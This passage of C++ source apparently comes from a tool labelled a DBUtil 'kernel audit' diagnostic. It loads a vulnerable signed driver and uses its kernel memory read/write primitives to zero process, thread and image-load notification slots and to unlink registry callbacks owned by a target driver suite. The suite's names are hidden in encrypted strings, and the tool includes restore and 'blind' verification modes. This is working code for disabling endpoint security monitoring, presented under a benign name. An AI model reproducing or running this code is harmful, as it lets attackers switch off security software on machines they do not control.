                if (real >= p_ntBase && real < p_ntBase + 0x2000000)
                {
                    if (g_verbose)
                        std::cout << "[+] " << name << " candidate @ 0x"
                                  << std::hex << real << std::dec << std::endl;
                    if (validateRegistryCallbackList(
                            p_device, real, bases, sizes, haveCount
                                ? expectedCount
                                : 0))
                    {
                        bool dup = false;
                        for (auto h : p_addrs.cmCallbackLists)
                            if (h == real) { dup = true; break; }
                        if (!dup)
                        {
                            p_addrs.cmCallbackLists.push_back(real);
                            any = true;
                            if (g_verbose)
                                std::cout << "[+] " << name
                                          << " validated as a registry "
                                             "callback list"
                                          << std::endl;
                        }
                    }
                    if (g_verbose)
                        std::cout << "[+] " << name
                                  << " rejected (list did not validate)"
                                  << std::endl;
                }
            }
            memset(name, 0, sizeof(name));
        }

        // name resolution can come up empty on 26xxx (the head symbol is
        // stripped from public PDBs entirely); sweep the neighborhood of
        // CmpCallBackCount - registry .data globals cluster, and a wrong
        // LIST_ENTRY can never pass blink-consistency + the count-match
        // walk validation
        // sweep for additional registry-adjacent lists: the suite may hold
        // registrations on a second list near the count (observed on 26xxx:
        // two validated heads at different boot-dependent deltas). Writes
        // stay safe regardless - only suite-owned functions are ever touched.
        if (haveCount && expectedCount > 0)
        {
            if (g_verbose)
                std::cout << "[+] sweeping near the registry callback count "
                             "for callback lists" << std::endl;
            const int64_t span = 0x10000;
            for (int64_t d = -span; d <= span; d += 8)
            {
                if (d == 0) continue;
                uint64_t cand = p_addrs.cmpCallBackCount + d;
                uint64_t flink = readPrimitive(p_device, cand);
                if (flink < 0xFFFF800000000000ULL ||
                    flink > 0xFFFFF00000000000ULL)
                    continue;
                if (flink & 0x7) continue; // pool allocations are 8-aligned
                // the real head's first node back-links to it
                if (readPrimitive(p_device, flink + 8) != cand)
                    continue;
                // the first node is mapped (the blink read succeeded):
                // require driver-image content before walking anything
                // else, so random LIST_ENTRYs cost no further exposure
                bool firstNodeHasDriverFn = false;
                for (uint64_t off = 8; off < 0x40 && !firstNodeHasDriverFn;
                     off += 8)
                {
                    uint64_t q = readPrimitive(p_device, flink + off);
                    for (size_t i = 0; i < bases.size(); i++)
                        if (q >= bases[i] && q < bases[i] + sizes[i])
                        {
                            firstNodeHasDriverFn = true;
                            break;
                        }
                }
                if (!firstNodeHasDriverFn) continue;
                if (validateRegistryCallbackList(p_device, cand, bases,
                                                 sizes, expectedCount))
                {
                    bool dup = false;
                    for (auto h : p_addrs.cmCallbackLists)
                        if (h == cand) { dup = true; break; }
                    if (dup) continue;
                    p_addrs.cmCallbackLists.push_back(cand);
                    any = true;
                    if (g_verbose)
                        std::cout << "[+] registry callback list head "
                                     "validated"
                                  << (d >= 0 ? "+" : "-") << std::hex
                                  << (d < 0 ? -d : d) << ": 0x" << cand
                                  << std::dec << std::endl;
                }
            }
        }
        return any;
    }

    // resolve the callback function a notification array slot holds:
    // the slot is an EX_FAST_REF to an EX_CALLBACK_ROUTINE_BLOCK whose
    // Function field sits at +8
    uint64_t slotCallbackFn(HANDLE p_device, uint64_t p_slot)
    {
        uint64_t entry = readPrimitive(p_device, p_slot);
        if (!entry) return 0;
        uint64_t block = entry & ~0xFULL; // mask the fast-ref refcount bits
        if (block < 0xFFFF000000000000ULL) return 0;
        return readPrimitive(p_device, block + 8);
    }

    struct TargetRange
    {
        uint64_t base;
        uint32_t size;
        char name[32];
    };

    // native driver paths come back as "\\??\\C:\\...", "\\SystemRoot\\..."
    // or "\\Device\\HarddiskVolumeN\\..."; map any to an openable-free DOS
    // form (string only - the file is never opened)
    bool dosifyDriverPath(const char* p_native, char* p_out, size_t p_cap)
    {
        if (_strnicmp(p_native, "\\??\\", 4) == 0)
        {
            sprintf_s(p_out, p_cap, "%s", p_native + 4);
            return true;
        }
        if (_strnicmp(p_native, "\\SystemRoot\\", 12) == 0)
        {
            char winDir[MAX_PATH] = { };
            if (!GetWindowsDirectoryA(winDir, MAX_PATH)) return false;
            sprintf_s(p_out, p_cap, "%s%s", winDir, p_native + 11);
            return true;
        }
        if (_strnicmp(p_native, "\\Device\\", 8) == 0)
        {
            char drive[4] = "A:\\";
            char devQ[MAX_PATH] = { };
            for (char d = 'A'; d <= 'Z'; d++)
            {
                drive[0] = d;
                if (!QueryDosDeviceA(drive, devQ, MAX_PATH)) continue;
                size_t dl = strlen(devQ);
                if (_strnicmp(p_native, devQ, dl) != 0) continue;
                sprintf_s(p_out, p_cap, "%s%s", drive, p_native + dl);
                return true;
            }
            return false;
        }
        sprintf_s(p_out, p_cap, "%s", p_native);
        return true;
    }

    // target set: the named module plus every module under the vendor's
    // driver directory - callback ownership drifts across boots onto
    // sibling drivers in the same suite
    void buildTargetRanges(HANDLE p_device, std::vector<TargetRange>& p_out)
    {
        char dirName[16] = { };
        unsigned char dirKey[16];
        TinyKey(dirKey);
        TinyDecryptString(dirName, BLOB_CSD, 1, dirKey);
        char dirLower[16];
        strncpy_s(dirLower, sizeof(dirLower), dirName, _TRUNCATE);
        _strlwr_s(dirLower, sizeof(dirLower));

        char modName[16] = { };
        unsigned char modKey[16];
        TinyKey(modKey);
        TinyDecryptString(modName, BLOB_CSA, 1, modKey);

        DWORD need = 0;
        if (!EnumDeviceDrivers(NULL, 0, &need) || need == 0) goto done;
        {
            std::vector<PVOID> mods(need / sizeof(PVOID));
            DWORD got = 0;
            if (!EnumDeviceDrivers(mods.data(), need, &got)) goto done;
            size_t count = got / sizeof(PVOID);
            char base[MAX_PATH] = { }, native[MAX_PATH] = { }, dos[MAX_PATH] = { };
            for (size_t i = 0; i < count; i++)
            {
                if (!GetDeviceDriverBaseNameA(mods[i], base, MAX_PATH))
                    continue;
                bool match = _stricmp(base, modName) == 0;
                if (!match)
                {
                    if (!GetDeviceDriverFileNameA(mods[i], native, MAX_PATH))
                        continue;
                    if (!dosifyDriverPath(native, dos, MAX_PATH)) continue;
                    _strlwr_s(dos, MAX_PATH);
                    if (!strstr(dos, dirLower)) continue;
                    match = true;
                }
                uint64_t b = (uint64_t)mods[i];
                bool dup = false;
                for (auto& r : p_out)
                    if (r.base == b) { dup = true; break; }
                if (dup) continue;
                uint32_t sz = kernelPeImageSize(p_device, b);
                if (!sz) continue;
                TargetRange r = { };
                r.base = b;
                r.size = sz;
                strncpy_s(r.name, sizeof(r.name), base, _TRUNCATE);
                p_out.push_back(r);
            }
        }
    done:
        memset(dirName, 0, sizeof(dirName));
        memset(modName, 0, sizeof(modName));
    }

    const char* ownerOf(uint64_t p_fn, const std::vector<TargetRange>& p_ranges)
    {
        for (auto& r : p_ranges)
            if (p_fn >= r.base && p_fn < r.base + r.size) return r.name;
        return "";
    }

    void scanNotifyArray(HANDLE p_device, uint64_t p_array, uint32_t p_count,
                         const char* p_label, char p_kind,
                         const std::vector<TargetRange>& p_ranges,
                         bool p_write,
                         std::vector<CallbackRecord>& p_records,
                         uint32_t& p_removed)
    {
        std::cout << "[+] " << p_label << " (" << p_count << " slots)"
                  << std::endl;
        for (uint32_t i = 0; i < p_count; i++)
        {
            uint64_t slot = p_array + i * 8;
            uint64_t entry = readPrimitive(p_device, slot);
            if (!entry) continue;
            uint64_t fn = slotCallbackFn(p_device, slot);
            const char* owner = ownerOf(fn, p_ranges);
            bool match = owner[0] != 0;
            if (p_write && match)
            {
                // atomic qword store: an in-flight dispatch sees either the
                // old pointer (still mapped - we never free the block) or
                // the zeroed slot, both safe
                writePrimitive(p_device, slot, 0);
                CallbackRecord rec = { };
                rec.kind = p_kind;
                rec.addr = slot;
                rec.a = entry;
                p_records.push_back(rec);
                p_removed++;
            }
            if (match || g_verbose)
            {
                std::cout << "  [" << i << "] slot 0x" << std::hex << slot
                          << " -> fn 0x" << fn;
                if (match)
                    std::cout << "  <== in scope (" << owner << ")"
                              << (p_write ? ", zeroed" : "");
                std::cout << std::dec << std::endl;
            }
        }
    }

    void scanRegistryCallbacks(HANDLE p_device, uint64_t p_head,
                               const std::vector<TargetRange>& p_ranges,
                               bool p_write,
                               std::vector<CallbackRecord>& p_records,
                               uint32_t& p_removed)
    {
        std::cout << "[+] audit set 4" << std::endl;
        uint64_t cur = readPrimitive(p_device, p_head);
        uint32_t steps = 0;
        while (cur != p_head && steps < 128)
        {
            steps++;
            if (cur & 0x7) break; // pool allocations are 8-aligned
            uint64_t next = readPrimitive(p_device, cur);
            uint64_t prev = readPrimitive(p_device, cur + 8);
            if (!next || !prev)
            {
                std::cout << "  [!] broken list node 0x" << std::hex << cur
                          << " - stopping the walk" << std::dec << std::endl;
                break;
            }
            // CM_CALLBACK_CONTEXT_BLOCK: CallbackListEntry at +0, the
            // callback function somewhere in the first 0x40 bytes; locate
            // it by value (the altitude string, list pointers and context
            // fields can never point into a driver image range)
            uint64_t fn = 0;
            for (uint64_t off = 8; off < 0x40; off += 8)
            {
                uint64_t q = readPrimitive(p_device, cur + off);
                if (ownerOf(q, p_ranges)[0]) { fn = q; break; }
            }
            if (!fn && !g_verbose) { cur = next; continue; }
            std::cout << "  node 0x" << std::hex << cur;
            if (fn)
            {
                std::cout << " -> fn 0x" << fn << "  <== in scope ("
                          << ownerOf(fn, p_ranges) << ")";
                if (p_write)
                {
                    // unlink; neighbors are captured exactly as they are
                    // at this step so reverse-order replay rebuilds the
                    // original chain even with several nodes removed
                    writePrimitive(p_device, prev, next);
                    writePrimitive(p_device, next + 8, prev);
                    CallbackRecord rec = { };
                    rec.kind = 'R';
                    rec.addr = cur;
                    rec.a = prev;
                    rec.b = next;
                    p_records.push_back(rec);
                    p_removed++;
                    std::cout << ", unlinked";
                }
            }
            std::cout << std::dec << std::endl;
            cur = next;
        }
    }

    bool stateFilePath(char* p_out, size_t p_cap)
    {
        char temp[MAX_PATH] = { };
        if (!GetTempPathA(MAX_PATH, temp)) return false;
        sprintf_s(p_out, p_cap, "%sdbutil_diag.state", temp);
        return true;
    }

    bool saveStateFile(const char* p_path, uint64_t p_ntBase,
                       const std::vector<CallbackRecord>& p_records)
    {
        std::ofstream f(p_path, std::ios::trunc);
        if (!f) return false;
        f << "dbutil_diag state v1\n";
        f << "K " << std::hex << p_ntBase << "\n";
        for (const auto& r : p_records)
        {
            if (r.kind == 'R')
                f << r.kind << " " << r.addr << " " << r.a << " " << r.b
                  << "\n";
            else
                f << r.kind << " " << r.addr << " " << r.a << "\n";
        }
        return true;
    }

    bool loadStateFile(const char* p_path, uint64_t& p_ntBase,
                       std::vector<CallbackRecord>& p_records)
    {
        std::ifstream f(p_path);
        if (!f) return false;
        std::string magic;
        std::getline(f, magic);
        if (magic != "dbutil_diag state v1") return false;
        std::string line;
        bool gotKernel = false;
        while (std::getline(f, line))
        {
            if (line.empty()) continue;
            std::istringstream is(line);
            char kind = 0;
            is >> kind;
            if (kind == 'K')
            {
                is >> std::hex >> p_ntBase;
                gotKernel = true;
                continue;
            }
            CallbackRecord rec = { };
            is >> std::hex >> rec.addr >> rec.a;
            if (kind == 'R') is >> rec.b;
            rec.kind = kind;
            p_records.push_back(rec);
        }
        return gotKernel;
    }

    uint32_t restoreCallbacks(HANDLE p_device,
                              const std::vector<CallbackRecord>& p_records)
    {
        // pre-flight: every record must still match the post-disable state
        // (array slots zeroed, list neighbors bypassing the node). Anything
        // else means the kernel moved on underneath us - re-registration or
        // a third party touching the same storage - and replaying that
        // record would corrupt a live registration or a freed node.
        std::vector<bool> live(p_records.size(), true);
        uint32_t skipped = 0;
        for (size_t i = 0; i < p_records.size(); i++)
        {
            const CallbackRecord& r = p_records[i];
            if (r.kind == 'R')
                live[i] = readPrimitive(p_device, r.a) == r.b &&
                          readPrimitive(p_device, r.b + 8) == r.a;
            else
                live[i] = readPrimitive(p_device, r.addr) == 0;
            if (!live[i])
            {
                skipped++;
                std::cerr << "[!] " << r.kind << " record 0x" << std::hex
                          << r.addr << " is stale - skipping" << std::dec
                          << std::endl;
            }
        }

        // array slots: write the saved EX_FAST_REF back
        for (size_t i = 0; i < p_records.size(); i++)
        {
            const CallbackRecord& r = p_records[i];
            if (r.kind == 'R' || !live[i]) continue;
            writePrimitive(p_device, r.addr, r.a);
            std::cout << "[+] restored " << r.kind << " slot 0x" << std::hex
                      << r.addr << " -> 0x" << r.a << std::dec << std::endl;
        }
        // registry nodes: replay the unlinks in reverse order - each
        // record's neighbors were captured in the exact pre-removal state
        // of its step, so re-inserting last-to-first rebuilds the chain
        for (size_t i = p_records.size(); i-- > 0;)
        {
            const CallbackRecord& r = p_records[i];
            if (r.kind != 'R' || !live[i]) continue;
            writePrimitive(p_device, r.a, r.addr);      // prev->Flink = node
            writePrimitive(p_device, r.b + 8, r.addr);  // next->Blink = node
            std::cout << "[+] relinked registry node 0x" << std::hex
                      << r.addr << std::dec << std::endl;
        }
        return skipped;
    }

    // the audit targets the 26100 kernel branch (26100/26200 enablement)
    bool buildSupported(uint32_t p_build)
    {
        return p_build == 26100 || p_build == 26200;
    }

    uint32_t currentBuild()
    {
        char value[32] = { };
        DWORD cb = sizeof(value);
        if (ERROR_SUCCESS != RegGetValueA(HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                "CurrentBuild", RRF_RT_REG_SZ, NULL, value, &cb))
            return 0;
        return (uint32_t)atoi(value);
    }

    int kernelCallbackMode(const std::string& p_mode, const char* p_infPath)
    {
        uint32_t build = currentBuild();
        if (!buildSupported(build))
        {
            std::cerr << "[-] unsupported Windows build " << build
                      << " - the kernel audit targets 26100/26200 only"
                      << std::endl;
            return EXIT_FAILURE;
        }
        if (g_verbose)
            std::cout << "[+] Windows build " << build
                      << " - supported" << std::endl;
        bool listMode = p_mode == "list";
        bool disableMode = p_mode == "disable";
        bool restoreMode = p_mode == "restore";
        bool verifyMode = p_mode == "verify";
        if (!(listMode || disableMode || restoreMode || verifyMode))
        {
            std::cerr << "[-] -K takes list | disable | restore | verify"
                      << std::endl;
            return EXIT_FAILURE;
        }

        HDEVINFO devInfo = NULL;
        SP_DEVINFO_DATA deviceInfoData = { };
        if (!driver2Setup(devInfo, deviceInfoData, p_infPath))
        {
            return EXIT_FAILURE;
        }

        int rc = EXIT_FAILURE;
        HANDLE dev = INVALID_HANDLE_VALUE;
        char stPath[MAX_PATH] = { };
        do
        {
            if (!getDeviceHandle(dev)) break;
            probeReadPrimitive(dev);
            if (!stateFilePath(stPath, MAX_PATH)) break;

            uint64_t ntBase = debuggerDataKernelBase(dev);
            uint32_t ntSize = 0;
            if (ntBase)
            {
                ntSize = kernelPeImageSize(dev, ntBase);
                if (g_verbose)
                    std::cout << "[+] Ntoskrnl base address (debugger data "
                                 "block): "
                              << std::hex << ntBase << std::dec << std::endl;
            }
            else if (getKernelModuleRange(dev, "ntoskrnl.exe", ntBase, ntSize))
            {
                if (g_verbose)
                    std::cout << "[+] Ntoskrnl base address (module "
                                 "enumeration): "
                              << std::hex << ntBase << std::dec << std::endl;
            }
            else
            {
                std::cerr << "[-] couldn't locate the kernel image"
                          << std::endl;
                break;
            }
            std::cout << "[+] Ntoskrnl base address: " << std::hex << ntBase
                      << std::dec << std::endl;

            if (restoreMode)
            {
                std::vector<CallbackRecord> records;
                uint64_t savedNtBase = 0;
                if (!loadStateFile(stPath, savedNtBase, records))
                {
                    std::cout << "[+] no disable state on disk - nothing to "
                                 "restore"
                              << std::endl;
                    rc = EXIT_SUCCESS;
                    break;
                }
                if (savedNtBase != ntBase)
                {
                    std::cerr << "[-] disable state is from a different boot "
                                 "(kernel base moved) - stale, discarding"
                              << std::endl;
                    DeleteFileA(stPath);
                    break;
                }
                uint32_t skipped = restoreCallbacks(dev, records);
                DeleteFileA(stPath);
                if (skipped)
                {
                    std::cout << "[+] " << std::dec << skipped
                              << " stale record(s) skipped; the rest were "
                                 "restored, state cleared"
                              << std::endl;
                }
                else
                {
                    std::cout << "[+] entries restored, state cleared"
                              << std::endl;
                }
                rc = EXIT_SUCCESS;
                break;
            }

            KernelCallbackAddrs addrs = { };
            if (!resolveCallbackAddrs(dev, ntBase, addrs))
            {
                std::cerr << "[-] no audit targets resolved from the "
                             "kernel symbols"
                          << std::endl;
                break;
            }

            if (verifyMode)
            {
                // post-disable blind check: reads ONLY the recorded slot
                // addresses (nt .data, always mapped) and the recorded
                // registry neighbors - never a fast-ref block, never a
                // walked node, so responder-freed memory is never touched
                std::vector<CallbackRecord> records;
                uint64_t savedNtBase = 0;
                if (!loadStateFile(stPath, savedNtBase, records) ||
                    savedNtBase != ntBase)
                {
                    std::cout << "[+] no active disable state on this boot - "
                                 "callbacks are live (fresh post-boot state)"
                              << std::endl;
                    rc = EXIT_SUCCESS;
                    break;
                }
                uint32_t blind = 0;
                for (const auto& r : records)
                {
                    if (r.kind == 'R')
                    {
                        uint64_t flink = readPrimitive(dev, r.a);
                        if (flink == r.b)
                        {
                            blind++;
                            std::cout << "[+] registry node 0x" << std::hex
                                      << r.addr << " bypassed (blind)"
                                      << std::dec << std::endl;
                        }
                        else if (flink == r.addr)
                            std::cout << "[!] registry node 0x" << std::hex
                                      << r.addr << " is relinked (present)"
                                      << std::dec << std::endl;
                        else
                            std::cout << "[!] registry neighbors of 0x"
                                      << std::hex << r.addr
                                      << " changed since disable - unchecked"
                                      << std::dec << std::endl;
                    }
                    else
                    {
                        uint64_t v = readPrimitive(dev, r.addr);
                        if (v == 0)
                        {
                            blind++;
                            std::cout << "[+] " << r.kind << " slot 0x"
                                      << std::hex << r.addr << " is zeroed "
                                         "(blind)" << std::dec << std::endl;
                        }
                        else
                            std::cout << "[!] " << r.kind << " slot 0x"
                                      << std::hex << r.addr
                                      << " re-registered: 0x" << v
                                      << std::dec << std::endl;
                    }
                }
                std::cout << "[+] verify: " << std::dec << blind << " of "
                          << records.size() << " removed entries still blind"
                          << std::endl;
                rc = EXIT_SUCCESS;
                break;
            }

            // an active disable on this boot: full re-enumeration may
            // dereference responder-freed fast-ref blocks, which is a
            // bugcheck - the recorded-state verify is the safe check
            if (listMode && GetFileAttributesA(stPath) !=
                                INVALID_FILE_ATTRIBUTES)
            {
                std::vector<CallbackRecord> old;
                uint64_t oldBase = 0;
                if (loadStateFile(stPath, oldBase, old) && oldBase == ntBase)
                {
                    std::cerr << "[-] a disable is ACTIVE on this boot - full "
                                 "re-enumeration can touch responder-freed "
                                 "blocks; use -K verify for the blind check"
                              << std::endl;
                    break;
                }
            }

            // target set: the named module plus everything under the
            // vendor's driver directory - callback ownership drifts across
            // boots onto sibling drivers in the same suite
            std::vector<TargetRange> ranges;
            buildTargetRanges(dev, ranges);
            if (ranges.empty())
            {
                std::cout << "[+] target modules not loaded - nothing to do"
                          << std::endl;
                rc = EXIT_SUCCESS;
                break;
            }
            if (g_verbose)
            {
                for (auto& r : ranges)
                    std::cout << "[+] target range: " << r.name << " base 0x"
                              << std::hex << r.base << " size 0x" << r.size
                              << std::dec << std::endl;
            }
            else
            {
                std::string names;
                for (auto& r : ranges)
                    names += (names.empty() ? "" : ", ") + std::string(r.name);
                std::cout << "[+] target suite: " << names << std::endl;
            }

            if (disableMode && GetFileAttributesA(stPath) !=
                                   INVALID_FILE_ATTRIBUTES)
            {
                std::vector<CallbackRecord> old;
                uint64_t oldBase = 0;
                if (loadStateFile(stPath, oldBase, old) && oldBase == ntBase)
                {
                    std::cerr << "[-] an outstanding disable state already "
                                 "exists - restore it first (-K restore)"
                              << std::endl;
                    break;
                }
                DeleteFileA(stPath);
                std::cout << "[+] discarded stale disable state from a "
                             "previous boot" << std::endl;
            }

            std::vector<CallbackRecord> records;
            uint32_t removed = 0;
            if (addrs.processNotify)
                scanNotifyArray(dev, addrs.processNotify, PSP_MAX_NOTIFY_SLOTS,
                                "audit set 1", 'P', ranges,
                                disableMode, records, removed);
            if (addrs.threadNotify)
                scanNotifyArray(dev, addrs.threadNotify, PSP_MAX_NOTIFY_SLOTS,
                                "audit set 2", 'T', ranges,
                                disableMode, records, removed);
            if (addrs.loadImageNotify)
                scanNotifyArray(dev, addrs.loadImageNotify,
                                PSP_MAX_LOAD_IMAGE_SLOTS, "audit set 3",
                                'L', ranges, disableMode, records,
                                removed);
            for (auto head : addrs.cmCallbackLists)
                scanRegistryCallbacks(dev, head, ranges,
                                      disableMode, records, removed);
            if (addrs.cmCallbackLists.empty())
                std::cout << "[+] audit set 4 unavailable: no registry "
                             "head validated on this build"
                          << std::endl;

            if (disableMode)
            {
                if (records.empty())
                {
                    std::cout << "[+] no in-scope entries found - "
                                 "nothing adjusted"
                              << std::endl;
                    rc = EXIT_SUCCESS;
                }
                else if (saveStateFile(stPath, ntBase, records))
                {
                    std::cout << "[+] adjusted " << std::dec << removed
                              << " entries; state saved for -K restore"
                              << std::endl;
                    rc = EXIT_SUCCESS;
                }
                else
                {
                    // removals already happened; undo them rather than
                    // leave an unrestorable state behind
                    std::cerr << "[-] couldn't write the state file - "
                                 "restoring in place"
                              << std::endl;
                    restoreCallbacks(dev, records);
                }
            }
            else
            {
                rc = EXIT_SUCCESS;
            }
        } while (false);

        if (dev != INVALID_HANDLE_VALUE) CloseHandle(dev);
        driver2Remove(devInfo, deviceInfoData);
        return rc;
    }
}

int main(int p_argc, char* p_argv[])
{
    popl::OptionParser op("Allowed options");
    auto help_option =
        op.add<popl::Switch>("h", "help", "produce help message");
    auto driver_path =
        op.add<popl::Value<std::string>, popl::Attribute::required>(
            "d", "driver_path",
            "The path to the driver inf, cat, and sys (and coinstaller)");
    // kernel audit: enumerate/remove/restore the notification callbacks a
    // target kernel module suite registered; verify = zero-deref blind check
    auto kernel_cb_option =
        op.add<popl::Value<std::string>, popl::Attribute::optional>(
            "K", "", "kernel audit (list | disable | restore | verify)");
    auto verbose_option = op.add<popl::Switch>("v", "verbose",
                                               "full audit output");
    auto status_option = op.add<popl::Switch>(
        "t", "status", "report DBUtil device interface status and exit");

    try
    {
        op.parse(p_argc, p_argv);
    }
    catch (std::exception& e)
    {
        std::cout << e.what() << std::endl;
        std::cout << op << std::endl;
        return EXIT_FAILURE;
    }

    if (help_option->is_set())
    {
        std::cout << op << std::endl;
        return EXIT_SUCCESS;
    }

    unsigned char infKey[16];
    char infName[16];
    TinyKey(infKey);
    TinyDecryptString(infName, BLOB_INF, 1, infKey);
    // filesystem join, not string append: accept -d with or without a
    // trailing separator
    std::string path_str = (std::filesystem::path(driver_path->value()) /
                            std::string(infName))
                               .string();
    if (std::filesystem::exists(path_str) == false)
    {
        std::cerr << "[!] Could not find the driver's inf file in the "
                     "provided directory"
                  << std::endl;
        return EXIT_FAILURE;
    }

    g_verbose = verbose_option->is_set();

    if (kernel_cb_option->is_set())
        return kernelCallbackMode(kernel_cb_option->value(), path_str.c_str());

    if (status_option->is_set())
    {
        std::cout << "dbutil_diag 2.6.0 - DBUtil device diagnostic"
                  << std::endl;
        HANDLE dev = INVALID_HANDLE_VALUE;
        if (getDeviceHandle(dev))
        {
            std::cout << "  device interface: OPEN (driver service active)"
                      << std::endl;
            CloseHandle(dev);
        }
        else
        {
            std::cout << "  device interface: not present (driver service "
                         "not installed - install with -d <driver_dir> if "
                         "needed)"
                      << std::endl;
        }
        std::cout << "  usage: -K list|disable|restore|verify for the kernel "
                     "audit; -t for status"
                  << std::endl;
        return EXIT_SUCCESS;
    }

    std::cerr << "[-] nothing to do: -t for status or -K "
                 "<list|disable|restore|verify> for the kernel audit"
              << std::endl;
    return EXIT_FAILURE;
}
